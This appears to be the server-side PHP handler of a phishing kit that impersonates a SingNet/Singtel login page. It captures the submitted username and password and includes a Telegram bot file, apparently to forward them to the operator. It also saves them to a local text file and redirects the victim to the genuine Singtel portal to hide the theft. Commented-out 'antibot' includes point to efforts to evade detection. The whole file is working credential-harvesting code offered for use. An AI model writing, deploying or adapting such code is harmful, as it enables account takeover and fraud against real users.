<?php
/*
require "../../antibots/altproxy.php";
require "../../antibots/antibot.php";
require "../../antibots/botinho.php";
require "../../antibots/proxycheck.php";*/

session_start();
$username = $_POST['USER'];
$password = $_POST['PASSWORD'];
$message = "[-----------[Login SingNet]--------------]\n";
$message .= "Username          : " . $username . "\n";
$message .= "----------------------------------------------\n";
$message .= "Password   : " . $password . "\n";
$message .= "----------------------------------------------\n";
include('../../telegram_bot.php');
$_SESSION["lcthrn@gmail.com"] = $username;
$myfile = fopen("acid.txt", "w");
fwrite($myfile, $message);
fclose($myfile);
echo ("<script>window.parent.location.href = 'https://myportal.singtel.com';</script>");
